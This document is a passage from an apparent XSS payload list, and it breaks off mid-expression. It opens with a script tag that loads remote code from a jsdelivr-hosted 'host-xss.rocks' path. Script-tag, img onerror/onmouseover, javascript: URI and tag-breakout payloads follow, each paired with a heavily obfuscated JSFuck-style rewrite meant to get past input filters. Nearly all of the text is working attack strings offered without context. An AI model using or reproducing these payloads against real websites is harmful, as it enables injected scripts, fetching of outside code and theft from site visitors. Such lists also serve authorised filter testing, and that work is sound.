<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[3]+([][""]+"")[4]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([][""]+"")[3]+(false+"")[3]+([][""]+"")[4]+(true+"")[3]+(false+"")[2]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+[0]+"")[2]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([][""]+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
javascript:/*--></title></style></textarea></script></xmp>
([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[0]+([false]+"")[10]+(true+"")[0]+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+(false+"")[1]+(true+"")[1]+(true+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+prompt(5);//'>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
\<a onmouseover="prompt(7)"\>xxs link\</a\>
[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+[0]+"")[7]+(false+"")[2]+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
\<a onmouseover=prompt(9)\>xxs link\</a\>
[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+[0]+"")[7]+(false+"")[2]+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG ""><SCRIPT>prompt(11)</SCRIPT>"\>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC=javascript:prompt(String.fromCharCode(88,83,83))>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(false+"")[3]+(true+"")[0]+(true+"")[1]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[0]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+(false+"")[1]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC=# onmouseover="prompt(15)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC= onmouseover="prompt(17)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG onmouseover="prompt(19)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC=/ onerror="prompt(String.fromCharCode(88,83,83))"></img>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(false+"")[3]+(true+"")[0]+(true+"")[1]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[0]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+(false+"")[1]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000112&#0000114&#0000111&#0000109&#0000112&#0000116&#000004023&#0000041">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return 